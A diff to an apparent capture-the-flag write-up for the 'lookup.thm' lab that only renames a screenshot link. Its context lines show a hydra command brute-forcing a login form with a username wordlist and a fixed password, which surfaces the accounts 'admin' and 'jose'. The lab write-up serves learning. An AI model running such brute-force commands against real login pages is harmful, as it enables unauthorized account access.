@@ -37,7 +37,7 @@ i couldnt break into admin account so i tried finding other accounts using hydra
 hydra -L /usr/share/seclists/Usernames/Names/names.txt -p test123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=wrong username or password" 
 ```
 
-![userenum](img/userenum.png "userenum")
+![usersenum](img/usersenum.png "usersenum")
 
 found admin and `jose`
 
